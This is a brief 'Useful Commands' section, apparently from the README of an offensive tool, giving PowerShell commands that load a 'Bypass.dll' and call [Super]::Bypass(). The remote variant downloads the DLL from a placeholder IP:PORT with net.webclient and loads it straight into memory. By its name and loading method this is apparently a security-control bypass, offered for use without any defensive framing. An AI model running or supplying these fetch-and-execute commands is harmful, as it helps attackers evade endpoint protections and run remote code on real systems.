## Useful Commands

```
PowerShell (locally)
[System.Reflection.Assembly]::LoadFile('Absolute_Path_to_DLL\Bypass.dll')
[Super]::Bypass()

PowerShell (remote)
[System.Reflection.Assembly]::Load((new-object net.webclient).DownloadData("http://IP:PORT/Bypass.dll")); 
[Super]::Bypass();
```
